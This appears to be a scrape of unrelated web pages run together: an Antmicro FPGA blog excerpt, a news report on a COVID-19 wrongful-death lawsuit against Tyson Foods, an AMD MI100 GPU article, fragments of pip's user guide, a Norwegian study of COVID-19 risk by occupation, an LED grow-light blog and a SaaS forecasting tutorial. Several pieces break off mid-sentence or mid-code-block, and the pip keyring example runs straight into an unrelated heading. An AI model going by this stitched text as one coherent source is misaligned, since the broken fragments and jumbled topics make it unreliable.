<p>We use and contribute to LiteDRAM, LiteX and other open source IP to develop unique designs interfaced with DDR memories for high-bandwidth video and other data processing systems; and RPC DRAM support is just one example of the enablement work we are performing in the ecosystem. Combined with the exciting work related to open source we are performing as part of <a href="https://antmicro.com/blog/2020/07/swerv-cores-tools-ecosystem/">CHIPS Alliance</a>, <a href="https://antmicro.com/blog/2020/06/skywater-open-source-pdk/">SkyWater PDK</a> and the fantastic enregy catalyzed by the open <a href="https://antmicro.com/technologies/risc-v/">RISC-V</a> CPU architecture (which is an obvious candidate for combining with RPC RAM both in soft- and hard CPU contexts), future is looking bright for tiny, open, ML-capable systems.</p>

<h3 id="antmicros-open-source-fpga-ip">Antmicro’s open source FPGA IP</h3>

<p>We often use FPGAs to build a wide array of configurable systems for our customers, leveraging the flexibility and customizability that this technology offers. We create open source FPGA IPs that are reusable across various designs and platforms without any licensing restrictions imposed on our customers. Antmicro’s open source IP cores portfolio includes MIPI CSI, MIDI, PCIe, USB, Ethernet etc.</p>

<p>The FPGA systems that we build consist of modern, vendor-neutral components that ensure future-proofness and give our clients full control over the product. Reach out to us at <a href="mailto:contact@antmicro.com">contact@antmicro.com</a> if you’d like to get a specialized FPGA-based system performing complex tasks.</p>

        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a “willful and wanton disregard for workplace safety.”</p>
<p>In a written statement issued Thursday afternoon, Tyson Foods’ president and chief executive officer, Dean Banks, said: “We are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>“We have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, we’ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>“Our top priority is and remains the health and safety of our team members.”</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant — over a third of the facility’s workforce — contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there “shook [him] to the core,” plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the “glorified flu” and told workers not to worry about it because “it’s not a big deal” and “everyone is going to get it.” On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, “We all have symptoms — you have a job to do.” After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didn’t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 “thank you bonuses” to employees who turned up for every scheduled shift for three months — a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it “vigorously disputes” the plaintiffs’ claims and has “invested millions of dollars to provide employees with safety and risk-mitigation equipment.”</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tyson’s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic “at the direction of a federal officer” — President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez family’s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had “directed” Tyson to do anything.</p>
<p>The Waterloo facility is Tyson’s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-content-area">
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/48301387cddb344c254ee94cde7f04d7/p/uploads/2020/11/db6591d4-1.png" alt="" width="700" height="313"></p>
<p>With the rising demand for HPC and AI-powered cloud applications comes a need for very powerful datacenter GPUs. Usually NVIDIA is the king of this field, but AMD’s latest MI100 GPU presents some serious competition.</p>
<h2 role="heading" aria-level="2">A Card For The HPC Market</h2>
<p>The card is fast, seriously fast. NVIDIA’s high end A100 GPU peaks at&nbsp;9.7 TFLOPS in FP64 workloads. The new “AMD Instinct MI100” leaps past that at 11.5 TFLOPS.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/2f6292f97a12046b544017f07246a4f8/p/uploads/2020/11/8d6e8097.png" alt="" width="700" height="312"></p>
<p>Of course, NVIDIA’s cards support other speedup techniques for AI-specific workloads in different number formats, such as the TensorFloat-32 precision format and<a href="https://www.cloudsavvyit.com/4796/nvidias-new-ampere-gpu-is-a-game-changer-for-artificial-intelligence/"> fine-grained structured sparsity</a>. For AI and Machine Learning workloads, NVIDIA is still king, as their cards are built specifically for tensor-based operations.</p>
<p>But, for general purpose High Performance Computing, the MI100 takes the crown for raw compute power. Plus, it’s nearly half the price, and is much more efficient per watt.</p>
<p>On top of the other improvements, the new architecture also brings mixed-precision improvements, with their “Matrix Core” technology delivering 7x greater FP16 performance compared to their prior generation of cards.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/6588bb99d6c97c60163b08630e9b8d86/p/uploads/2020/11/292c692b.png" alt="" width="700" height="216"></p>
<p>AMD CPUs and Instinct GPUS are <a href="https://www.olcf.ornl.gov/frontier/">both powering two of the US Department of Energy’s exascale supercomputers</a>. The “Frontier” supercomputer is planned to be built next year with current Epyc CPUs and MI100s, and will deliver more than 1.5 exaflops of peak computing power. The “El Capitan” supercomputer is planned to be built in 2023 on next gen hardware, and will deliver more than 2 exaflops of double precision power.</p>
<h2 role="heading" aria-level="2">Can ROCm Live Up to CUDA?</h2>
<p>Of course, all of this power is useless if the software doesn’t support it. It’s no secret that NVIDIA has managed to make machine learning a bit of a walled garden.</p>
<p>NVIDIA’s compute framework is called <a href="https://en.wikipedia.org/wiki/CUDA">CUDA</a>, or&nbsp;Compute Unified Device Architecture. It’s proprietary, and only works with their cards. But since their cards have historically been the fastest, many applications are only built with CUDA support first and foremost.</p>
<p>There are cross-platform programming models, most notably OpenCL, which AMD supports very well <a href="https://rocmdocs.amd.com/en/latest/">with their ROCm platform</a>. Both NVIDIA cards and AMD cards support OpenCL, but because NVIDIA only supports it by transpiling to CUDA, it’s actually slower to use OpenCL with an NVIDIA card. Because of this, not all applications will support it.</p>
<p>Ultimately, you’ll need to do your own research and see if the application you intend to run can be run on AMD cards, and maybe be prepared for some tinkering and bug fixing. NVIDIA GPUs on the otherhand are mostly plug and play, so even if AMD is faster, NVIDIA can continue to hinder them with closed-source software.</p>
<p>However, this situation is getting better—AMD is committed to open sourcing everything and creating an open environment. Tensorflow and PyTorch, two very popular ML frameworks, both support the ROCm ecosystem.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/03aae3c52689bd7fd58e8278df8fefac/p/uploads/2020/11/301c98b9.png" alt="" width="697" height="479"></p>
<p>Hopefully the raw specs of AMD’s latest offerings can push the industry to a more competitive environment. After all, they’re being put to use in supercomputers</p>

<div id="running-pip">
<h2>Running pip<a href="#running-pip" title="Permalink to this headline">¶</a></h2>
<p>pip is a command line program. When you install pip, a <code><span>pip</span></code> command is added
to your system, which can be run from the command prompt as follows:</p>
<div>
<p><label for="tab-set--0-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>python</span> <span>-m</span> <span>pip</span></code> executes pip using the Python interpreter you
specified as python. So <code><span>/usr/bin/python3.7</span> <span>-m</span> <span>pip</span></code> means
you are executing pip for your interpreter located at /usr/bin/python3.7.</p>
</div>
<p><label for="tab-set--0-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>py</span> <span>-m</span> <span>pip</span></code> executes pip using the latest Python interpreter you
have installed. For more details, read the <a href="https://docs.python.org/3/using/windows.html#launcher">Python Windows launcher</a> docs.</p>
</div>
</div>
</div>
<div id="installing-packages">
<h2>Installing Packages<a href="#installing-packages" title="Permalink to this headline">¶</a></h2>
<p>pip supports installing from <a href="https://pypi.org/">PyPI</a>, version control, local projects, and
directly from distribution files.</p>
<p>The most common scenario is to install from <a href="https://pypi.org/">PyPI</a> using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirement-specifiers"><span>Requirement Specifiers</span></a></p>
<div>

</div>
<div id="basic-authentication-credentials">
<h2>Basic Authentication Credentials<a href="#basic-authentication-credentials" title="Permalink to this headline">¶</a></h2>
<p>pip supports basic authentication credentials. Basically, in the URL there is
a username and password separated by <code><span>:</span></code>.</p>
<p><code><span>https://[username[:password]@]pypi.company.com/simple</span></code></p>
<p>Certain special characters are not valid in the authentication part of URLs.
If the user or password part of your login credentials contain any of the
special characters
<a href="https://en.wikipedia.org/wiki/Percent-encoding#Percent-encoding_reserved_characters">here</a>
then they must be percent-encoded. For example, for a
user with username “user” and password “he//o” accessing a repository at
pypi.company.com, the index URL with credentials would look like:</p>
<p><code><span>https://user:he%2F%2Fo@pypi.company.com</span></code></p>
<p>Support for percent-encoded authentication in index URLs was added in pip 10.0.0
(in <a href="https://github.com/pypa/pip/issues/3236">#3236</a>). Users that must use authentication
for their Python repository on systems with older pip versions should make the latest
get-pip.py available in their environment to bootstrap pip to a recent-enough version.</p>
<p>For indexes that only require single-part authentication tokens, provide the token
as the “username” and do not provide a password, for example -</p>
<p><code><span>https://0123456789abcdef@pypi.company.com</span></code></p>
<div id="netrc-support">
<h3>netrc Support<a href="#netrc-support" title="Permalink to this headline">¶</a></h3>
<p>If no credentials are part of the URL, pip will attempt to get authentication credentials
for the URL’s hostname from the user’s .netrc file. This behaviour comes from the underlying
use of <a href="https://requests.readthedocs.io/en/master/user/authentication/#netrc-authentication">requests</a> which in turn delegates it to the <a href="https://docs.python.org/3/library/netrc.html">Python standard library</a>.</p>
<p>The .netrc file contains login and initialization information used by the auto-login process.
It resides in the user’s home directory. The .netrc file format is simple. You specify lines
with a machine name and follow that with lines for the login and password that are
associated with that machine. Machine name is the hostname in your URL.</p>
<p>An example .netrc for the host example.com with a user named ‘daniel’, using the password
‘qwerty’ would look like:</p>
<div><div><pre><span></span>machine example.com
login daniel
password qwerty
</pre></div>
</div>
<p>As mentioned in the <a href="https://docs.python.org/3/library/netrc.html">standard library docs</a>,
only ASCII characters are allowed. Whitespace and non-printable characters are not allowed in passwords.</p>
</div>
<div id="keyring-support">
<h3>Keyring Support<a href="#keyring-support" title="Permalink to this headline">¶</a></h3>
<p>pip also supports credentials stored in your keyring using the <a href="https://pypi.org/project/keyring/">keyring</a>
library. Note that <code><span>keyring</span></code> will need to be installed separately, as pip
does not come with it included.</p>
<div><div><pre><span></span>pip install keyring
<span>echo</span> your-password <span>|</span> keyring <span>set</span> pypi.company.com your-username

<h2>Using a Proxy Server<a href="#using-a-proxy-server" title="Permalink to this headline">¶</a></h2>
<p>When installing packages from <a href="https://pypi.org/">PyPI</a>, pip requires internet access, which
in many corporate environments requires an outbound HTTP proxy server.</p>
<p>pip can be configured to connect through a proxy server in various ways:</p>
<ul>
<li><p>using the <code><span>--proxy</span></code> command-line option to specify a proxy in the form
<code><span>[user:passwd@]proxy.server:port</span></code></p></li>
<li><p>using <code><span>proxy</span></code> in a <a href="#config-file"><span>Config file</span></a></p></li>
<li><p>by setting the standard environment-variables <code><span>http_proxy</span></code>, <code><span>https_proxy</span></code>
and <code><span>no_proxy</span></code>.</p></li>
<li><p>using the environment variable <code><span>PIP_USER_AGENT_USER_DATA</span></code> to include
a JSON-encoded string in the user-agent variable used in pip’s requests.</p></li>
</ul>
</div>
<div id="requirements-files">
<h2>Requirements Files<a href="#requirements-files" title="Permalink to this headline">¶</a></h2>
<p>“Requirements files” are files containing a list of items to be
installed using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> like so:</p>
<div>
<p><label for="tab-set--2-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--2-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>Details on the format of the files are here: <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirements-file-format"><span>Requirements File Format</span></a>.</p>
<p>Logically, a Requirements file is just a list of <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> arguments
placed in a file. Note that you should not rely on the items in the file being
installed by pip in any particular order.</p>
<p>In practice, there are 4 common uses of Requirements files:</p>
<ol>
<li><p>Requirements files are used to hold the result from <a href="https://pip.pypa.io/en/latest/reference/pip_freeze/#pip-freeze"><span>pip freeze</span></a> for the
purpose of achieving <a href="#repeatability"><span>repeatable installations</span></a>.  In
this case, your requirement file contains a pinned version of everything that
was installed when <code><span>pip</span> <span>freeze</span></code> was run.</p>
<div>
<p><label for="tab-set--3-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip freeze &gt; requirements.txt
python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--3-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip freeze &gt; requirements.txt
py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
</li>
<li><p>Requirements files are used to force pip to properly resolve dependencies.
pip 20.2 and earlier <a href="https://github.com/pypa/pip/issues/988">doesn’t have true dependency resolution</a>, but instead simply uses the first
specification it finds for a project. E.g. if <code><span>pkg1</span></code> requires
<code><span>pkg3&gt;=1.0</span></code> and <code><span>pkg2</span></code> requires <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code>, and if <code><span>pkg1</span></code> is
resolved first, pip will only use <code><span>pkg3&gt;=1.0</span></code>, and could easily end up
installing a version of <code><span>pkg3</span></code> that conflicts with the needs of <code><span>pkg2</span></code>.
To solve this problem, you can place <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code> (i.e. the correct
specification) into your requirements file directly along with the other top
level requirements. Like so:</p>
<div><div><pre><span></span><span>pkg1</span>
<span>pkg2</span>
<span>pkg3</span><span>&gt;=</span><span>1.0</span><span>,</span><span>&lt;=</span><span>2.0</span>
</pre></div>
</div>
</li>
<li><p>Requirements files are used to force pip to install an alternate version of a
sub-dependency.  For example, suppose <code><span>ProjectA</span></code> in your requirements file
requires <code><span>ProjectB</span></code>, but the latest version (v1.3) has a bug, you can force
pip to accept earlier versions like so:</p>

</li>
<li><p>Requirements files are used to override a dependency with a local patch that
lives in version control.  For example, suppose a dependency
<code><span>SomeDependency</span></code> from PyPI has a bug, and you can’t wait for an upstream
fix.
You could clone/copy the src, make the fix, and place it in VCS with the tag
<code><span>sometag</span></code>.  You’d reference it in your requirements file with a line like
so:</p>
<div><div><pre><span></span><span>git</span><span>+</span><span>https</span><span>:</span><span>//</span><span>myvcs</span><span>.</span><span>com</span><span>/</span><span>some_dependency</span><span>@sometag</span><span>#egg=SomeDependency</span>
</pre></div>
</div>
<p>If <code><span>SomeDependency</span></code> was previously a top-level requirement in your
requirements file, then <strong>replace</strong> that line with the new line. If
<code><span>SomeDependency</span></code> is a sub-dependency, then <strong>add</strong> the new line.</p>
</li>
</ol>
<p>It’s important to be clear that pip determines package dependencies using
<a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#declaring-dependencies">install_requires metadata</a>,
not by discovering <code><span>requirements.txt</span></code> files embedded in projects.</p>

</ul>
</div>
<div id="constraints-files">
<h2>Constraints Files<a href="#constraints-files" title="Permalink to this headline">¶</a></h2>
<p>Constraints files are requirements files that only control which version of a
requirement is installed, not whether it is installed or not. Their syntax and
contents is nearly identical to <a href="#requirements-files"><span>Requirements Files</span></a>. There is one key
difference: Including a package in a constraints file does not trigger
installation of the package.</p>
<p>Use a constraints file like so:</p>
<div>
<p><label for="tab-set--4-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -c constraints.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--4-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -c constraints.txt
</pre></div>
</div>
</div>
</div>
<p>Constraints files are used for exactly the same reason as requirements files
when you don’t know exactly what things you want to install. For instance, say
that the “helloworld” package doesn’t work in your environment, so you have a
local patched version. Some things you install depend on “helloworld”, and some
don’t.</p>
<p>One way to ensure that the patched version is used consistently is to
manually audit the dependencies of everything you install, and if “helloworld”
is present, write a requirements file to use when installing that thing.</p>
<p>Constraints files offer a better way: write a single constraints file for your
organisation and use that everywhere. If the thing being installed requires
“helloworld” to be installed, your fixed version specified in your constraints
file will be used.</p>
<p>Constraints file support was added in pip 7.1. In <a href="#resolver-changes-2020"><span>Changes to the pip dependency resolver in 20.3 (2020)</span></a> we did a fairly comprehensive overhaul, removing several
undocumented and unsupported quirks from the previous implementation,
and stripped constraints files down to being purely a way to specify
global (version) limits for packages.</p>
</div>
<div id="installing-from-wheels">
<h2>Installing from Wheels<a href="#installing-from-wheels" title="Permalink to this headline">¶</a></h2>
<p>“Wheel” is a built, archive format that can greatly speed installation compared
to building and installing from source archives. For more information, see the
<a href="https://wheel.readthedocs.io/">Wheel docs</a> , <span id="index-0"></span><a href="https://www.python.org/dev/peps/pep-0427"><strong>PEP 427</strong></a>, and <span id="index-1"></span><a href="https://www.python.org/dev/peps/pep-0425"><strong>PEP 425</strong></a>.</p>
<p>pip prefers Wheels where they are available. To disable this, use the

<p>If no satisfactory wheels are found, pip will default to finding source
archives.</p>
<p>To install directly from a wheel archive:</p>
<div>
<p><label for="tab-set--5-input--1">Unix/macOS</label></p><div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Researchers at the Norwegian Institute of Public Health have investigated whether occupational groups with frequent contact with customers, students, users or patients have an increased risk of COVID-19. Data are retrieved from health registries and other registries.</p>
<p>“We see that healthcare personnel and drivers were most exposed in the first period of the epidemic in the winter and spring of 2020. This autumn, we did not find more cases of COVID-19 among healthcare personnel than among other groups. The risk may have been higher this autumn for employees that meet many customers, such as bartenders and waiters,” says Karin Magnusson, researcher at the Norwegian Institute of Public Health and first author of the study.</p>
<h2>The most important findings</h2>
<h3>Period February-July</h3>
<p>The results are preliminary and show that in the period from February to mid-July 2020 there were:</p>
<ul>
<li>2.3 COVID-19 cases per 1 000 people in their working age (20-70 years) in Norway.</li>
<li>Among health professionals such as physiotherapists, dentists, nurses and doctors, there were 3.5 to 6.5 cases per 1 000, which is 1.5 to 3 times more than in the rest of the population of working age.</li>
<li>Among taxi drivers, bus drivers and tram drivers, there was a similar increase: from 3.4 to 5.5 cases per 1 000.</li>
</ul>
<h3>Period July-October</h3>
<p>In the period from mid-July to mid-October 2020 there were:</p>
<ul>
<li>2.6 COVID-19 cases per 1000 people of working age in Norway, which is higher than in the first period.</li>
<li>Most vulnerable in the second period were employees in the catering industry, such as bartenders and waiters, as well as flight attendants and boat stewards. The number of COVID-19 cases ranged from 6.2 to 8.9 per 1 000.</li>
<li>Among healthcare personnel, the number in the second period was lower or at the same level as among others of working age.</li>
<li>Among bus drivers and tram drivers, there were similar levels as among other people of working age, however there were more cases among taxi drivers (4.2 per 1000).</li>
</ul>
<h3>Results per occupational group</h3>
<p>The results are divided by occupational group. Among teachers, there were no more COVID-19 cases when compared to everyone in their working age, this applies to both periods.</p>


        <figure>

                <a href="https://www.fhi.no/contentassets/33240a54e1df42dda18cdc299408b1c7/occupations-eng.png" data-lightbox="image-gallery">

                </a>


        </figure>



<p>The number of confirmed COVID-19 per 1000 working people in different occupations in Norway, before and after 18 July 2020. Vertical lines show the proportion of confirmed cases for everyone of working age (20-70 years) for the two periods.</p>
<h2>Test criteria can explain differences between periods</h2>
<p>“The difference between the first and second wave may be due to changes in the test criteria. In the first wave, there was a shortage of test equipment, and patients, risk groups and healthcare personnel were prioritised for testing. In the second wave, close contacts and people with mild symptoms could also be tested. Another explanation may be infection control measures, including the fact that fewer people went abroad on holiday,” says Magnusson.</p>
<p>“The high proportion of doctors who were infected in the first period may, for example, have been infected on holiday in Italy, and not in Norway at the doctor's office. However, we do not know this, so one explanation could therefore also be better protection of healthcare personnel. In future studies, we can put several possible explanatory factors together and learn more about the risk of infection in different settings,” she adds.</p>
<h2>Hospital admissions</h2>
<p>There were no differences between occupational groups for severe COVID-19 disease and admissions to hospital. Dentists were the exception, with more hospital admissions than other occupational groups. This raises the question of whether infection with a large dose of virus from individuals increases the risk of more serious disease, but the numbers are low and therefore uncertain.</p>
<h2>About the study</h2>
<p>The purpose was to study whether the risk of COVID-19 and admissions to hospital increased among workers in occupations with a lot of direct contact with other people, compared with others of working age.</p>
<p>The study includes more than 3.5 million inhabitants of working age, between 20 and 70 years. The average age was 44 years, and there was an equal distribution between men and women. Each occupational group was compared with the rest of the working population of working age, and the risk was adjusted for age, gender and country of birth.</p>
<p>Data about COVID-19 were retrieved from the <a href="https://www.fhi.no/sv/smittsomme-sykdommer/corona/norsk-beredskapsregister-for-covid-19/">Beredt-19</a> registry at the Norwegian Institute of Public Health. This registry combines data from, among others, the Norwegian Surveillance System for Communicable Diseases (MSIS), the Norwegian Patient Registry, the National Population Register and NAV's employer and employee register.</p>
<p>As far as the researchers are aware, this is the first national study on occupational activity and COVID-19 risk. The methods used are identical to those described in the reference (Magnusson <em>et al</em>., 2020), with updated data including November 3rd 2020.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <p>Many indoor growers wonder if they can use any old LED light as a grow light. They thought these two types of LED lights had no difference as they can both emit human visible light.</p>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/grow_light_vs_regular_led_light.jpg?v=1605679235" alt="medic grow led grow light vs regular led light"></p>
<div><p>However, we cannot use a regular LED light as a <a href="https://en.wikipedia.org/wiki/Grow_light" target="_blank" title="grow light" rel="noopener noreferrer">grow light</a>, because they are not created equally.</p><p>Regular lights only provide illumination; that is to say, they are engineered as an artificial light source in order to lighten your dark spaces. They are comprised of narrow spectral wavelengths and usually do not have the proper spectrum of light to support photosynthesis.</p></div>
<div><p>On the other hand, grow lights are specifically designed to generate the right amount of light so plants can photosynthesize.</p><p>We've listed several areas where you can differentiate normal bulbs from grow lights:</p><p><strong>Spectrum</strong></p></div>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/different_colors_effects_on_plants.jpg?v=1605683978" alt="different colors effects on plants"></p>
<div><p>Many LED grow light manufacturers perform numerous experiments and study thousands of <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6524371/" target="_blank" title="light spectrums" rel="noopener noreferrer">scientific reports about the specific light color wavelengths</a> so that they can produce perfect grow lights with several wavelength colors that plants need. They are: red and infrared, blue and ultraviolet, and green.</p><p>Among these colors, blue and red wavelengths are the most important to plants. Blue is responsible for leafy growth and the red for flowering and budding. To start the seeds, grow lights should produce a lot of blue light which is the most important factor during the early growth stages. And when it's time to bloom, LED lights begin to emit red spectrum to promote plant growth.</p><p>Ultraviolet light guides the plants to flower and it helps sterilization. Green is less liked by plants, so grow lights have less of a green element, but it could improve the rate of leaf expansion and stem elongation, which in turn results in higher biomass accumulation (yield).</p></div>
<div><p>Infrared is not visible to the eyes. It is less effective than red and blue, but it will penetrate deeper and through the leaf, which increases cell expansion so you will get numbers of leaves and increase branch sizes in the end.</p><p><strong>Efficiency</strong></p></div>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/grow_light_efficiency.jpg?v=1605686310" alt="grow light efficiency"></p>

<div><p>Regular LED bulbs have a low light output per watt, which means that it takes more energy to produce the same light. Standard fluorescent lights are twice as efficient as normal bulbs, while LED grow lights are about five times more efficient than similar regular bulbs.</p><p><strong>Heat Dissipation</strong></p></div>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/grow_light_feat_dissipation.png?v=1605686876" alt="grow light feat dissipation"></p>
<div><p>Many regular lights produced much heat and should be hung no closer than 24 inches to avoid burning the plant. They also require a ventilation system to remove the heat from the room. Grow lights stay much cooler and can be placed about four inches above plants for maximum effectiveness. Moreover, modern LED lights are now engineered to give off heat passively, either by use of a heat sink or by diverting heat away from the diodes.</p><p><strong>Life Expectancy</strong></p></div>
<div><p>Regular lamps only have an average lifespan of 750 hours, but many good-quality <a href="https://medicgrow.com/products/medic-grow-led-grow-light-ez-6" target="_blank" title="long lifespan led grow light" rel="noopener noreferrer">LED grow lights</a> last approximately 50,000 hours, depending on wattage. That's a big difference!</p></div>
<h2><strong>How Many Hours a Day Should Grow Lights be on?</strong></h2>
<div><p>Every plant will require different types and amounts of light. Some do better in colder and less sunny areas than others. Plants that will produce fruits and vegetables will likely need more light. Plan on keeping your LED light on for at least 14-16 hours per day. Keep them on a timer if possible to ensure they operate on a 14-16 cycle.</p></div>
<h2><strong>Should I Turn off the Light at the Night?</strong></h2>
<p>Yes you should, plants need to rest too. Night gives plants time to eat, rest, and store enough energy. While photosynthesis ceases, plants begin to respire.</p>
<p>During the day time, plants absorb enough light and nutrients to supply plant cells. At night, this process continues but slowly turns the energy into carbohydrates which plants store for later use.</p>
<div><p>So basically, the lack of light allows plants to reset themselves and move the nutrients to where they'll be used when light arrives the next day.</p></div>
<h2><strong>Can Too Much Light Kill a Plant?</strong></h2>
<p>Well, if your plants are in the vegetative stage, it’s okay to keep your grow light on for 24 hours. Even though 24 hours of light is not recommended, it won’t kill your plants.</p>
<div><p>However, when it comes to flowering phase, too much light will prevent them entering the blooming stage even if it has started budding.</p></div>
<h2><strong>What LED Grow Light Should I Buy?</strong></h2>
<p>Although LED grow lights perform better than traditional lights, you should buy a grow light equipped with a perfect wavelength combination for your plants.</p>
<div><p><a href="https://medicgrow.com/blogs/news/how-to-pick-a-best-led-grow-light" target="_blank" title="led grow light wavelengths" rel="noopener noreferrer">As discusse</a><a href="https://medicgrow.com/blogs/news/led-grow-light-distance-chart-how-far-should-i-hang-the-grow-light-from-my-plants" target="_blank" title="plants different stages" rel="noopener noreferrer">d</a><a href="https://medicgrow.com/blogs/news/how-to-pick-a-best-led-grow-light" target="_blank" title="led grow light wavelengths" rel="noopener noreferrer"> earlier</a>, wavelengths facilitate various phases of plant growth, such as germination, vegetation, or flowering. For example, LEDs that are perfect for growing tomatoes may not be as effective with cannabis.</p><p>Many LED grow light manufacturers bring out an adjustable full spectrum LED grow light which produces different wavelengths to stimulate plants at different stages.</p></div>
<div><p>So if the LEDs are needed to take care of your indoor plant at different stages, there is a good option of purchasing a full spectrum LED grow light or an adjustable one.</p></div>

        <h2>SaaS Revenue Forecasting</h2>
      </p>

      <!-- DESKTOP -->
      

      <!-- MOBILE -->
      
      

      

      <div><p>
        There are many reasons you might want to create a financial forecast, most of which boil down to either 1) helping you manage the business and understand its dynamics better, or 2) telling the story of the company to others (whether the internal team, senior management, the board, investors, or prospective investors).
        </p><p>
        Here we’ll show you how to forecast revenue (and associated key metrics) for a subscription SaaS business.
        </p></div>

      <div><p>
        If you'd like to follow along in Excel, here's the file we'll be walking through (though you'll still be able to follow along without it):
        </p><a href="#" type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" rel="nofollow" onclick="download_file(event)">
          <p><i></i>Download the Example Model
          </p>
        </a>
      </div>



      

      <div><p>
        We’ll start first by forecasting our number of active subscribers. To do this, we forecast two key components: The number of new subscribers in a given month, and the number of canceled subscriptions (or “churn”).
        </p><p>
        To begin with a simple illustration, we’ll assume that we win 10 new subscribers per month. We’ll also assume that these subscriptions are cancellable any time, and that 10% of existing subscribers choose to cancel each month.
        </p><p>
        The beginning # of active subscribers in any period equals the ending number from the prior month. We refer to this method of forecasting as a “screw”.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-1.png"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-1.png" data-enlargeable=""></p><p>
              <span>
                A basic subscriber forecast.
              </span>
            </p>
        </div>
      </div>

